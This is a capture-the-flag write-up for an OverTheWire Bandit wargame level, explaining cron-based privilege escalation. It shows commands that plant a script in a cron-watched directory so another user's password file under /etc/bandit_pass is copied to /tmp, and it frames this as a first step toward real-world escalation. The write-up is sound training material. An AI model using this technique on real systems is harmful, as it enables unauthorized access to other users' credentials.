![](../../../assets/Pasted%20image%2020250807143515.png)

### Challenge Description

>In this level, I had to find out what a scheduled cronjob was running, who ran it, and how to use it. The challenge was to understand cron and write a custom shell script that the system would execute with higher privileges. Since the script gets deleted right after running, timing was everything.
>
 This was my first real taste of cron-based privilege escalation and how tiny misconfigurations can be a hacker’s playground.

**Goal:** Find the password for user `bandit24`.

---

### Step-by-Step Solution


---


#### 🟦 Step 1: Look for Cronjob Configurations

List the cron configuration files:

```bash
cd /etc/cron.d/
ls
```

You’ll see a file named:

```
cronjob_bandit24
```

Check what’s inside:

```bash
cat cronjob_bandit24
```

Output:

```bash
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

This means that every minute, the script `/usr/bin/cronjob_bandit24.sh` is executed by the user `bandit24`.

---

#### 🟦 Step 2: Read and Understand the Cron Script

View the script:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

**What this script does:**

- Changes into `/var/spool/bandit24/foo`
    
- Loops through all files (including hidden ones)
    
- If a file is owned by `bandit23`, it executes it (with a timeout of 60s)
    
- Then deletes it
    

---

#### 🟦 Step 3: Create Your Payload Script


![](../../../assets/Pasted%20image%2020250807150023.png)

We need to drop a script that will get executed by `bandit24` and reveal its password.

Create the script:

```bash
echo '#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password_bandit23' > /tmp/my_script.sh
```

Make it executable:

```bash
chmod +x /tmp/my_script.sh
```

---

#### 🟦 Step 4: Move the Script to Target Directory

Place it where the cronjob will look for it:

```bash
mv /tmp/my_script.sh /var/spool/bandit24/foo/
```

Try listing the directory (optional):

```bash
cd /var/spool/bandit24/foo/
ls
```

Expected output:

```
ls: cannot open directory '.': Permission denied
```

That’s fine — it just means the directory is protected, but the file is still there.

---

#### 🟦 Step 5: Wait and Grab the Password

After about 1 minute, check the file where you told your script to drop the password:

```bash
cat /tmp/bandit24_password_bandit23
```

Output:

```
Redacted ######################
```

You’ve got the password for `bandit24`.

---

### ✅ Final Thoughts

This challenge is the first major step toward **real-world privilege escalation**:

- You identify a scheduled task running as a higher-privileged user
    
- You inject code (your script) that gets executed by the system
    
- You retrieve data or escalate privileges using this vector
    

You also get to:

- Write your first functional **bash script**
    
- Understand how **cron jobs** can introduce vulnerabilities if not handled carefully
    
- Work with **permissions, file ownership**, and **script execution**
    

If you mastered this — take a moment to celebrate — you’ve done something most beginner hackers haven’t yet!

---

### 📚 Further Resources

If you want to go deeper into cron-based privilege escalation and Linux scripting, check these out:

- [GTFOBins - Cron](https://gtfobins.github.io/gtfobins/cron/)
    
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs)
    
- [OverTheWire Bandit Levels](https://overthewire.org/wargames/bandit/)
    
- [Crontab.guru (cron time expression helper)](https://crontab.guru/)
    
- [Bash scripting cheat sheet](https://devhints.io/bash)
    

---
















 